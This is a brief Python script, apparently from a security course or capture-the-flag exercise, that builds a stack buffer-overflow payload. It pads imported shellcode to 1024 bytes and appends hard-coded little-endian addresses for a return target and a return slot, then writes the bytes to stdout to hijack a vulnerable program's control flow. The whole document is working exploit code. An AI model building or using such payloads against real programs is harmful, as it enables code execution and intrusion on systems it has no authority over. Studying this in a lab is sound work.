import struct
import sys
from shellcode import shellcode

  

RET_TGT  = 0xfffec5a8    
RET_SLOT = 0xfffec9bc     

remaining = 1024 - len(shellcode)

sys.stdout.buffer.write(shellcode + b"a"*remaining + struct.pack("<II", RET_TGT, RET_SLOT))